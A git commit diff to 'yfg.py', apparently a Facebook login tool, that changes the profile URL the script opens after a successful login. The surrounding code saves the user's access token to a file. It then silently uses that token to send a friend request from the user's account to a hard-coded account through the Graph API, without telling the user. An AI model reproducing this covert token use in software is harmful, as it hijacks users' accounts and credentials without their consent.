9fb50ec0b295d9100f11a7ddbef972fe9b571d74
Qamar Abbas <50745881+qamarbro@users.noreply.github.com>
2020-04-28 04:06:53 -0700

    Update yfg.py

--- yfg.py
+++ yfg.py
@@ -141,7 +141,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/Omi6t')
+				os.system('xdg-open https://www.Facebook.com/qamar.janu.jani')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
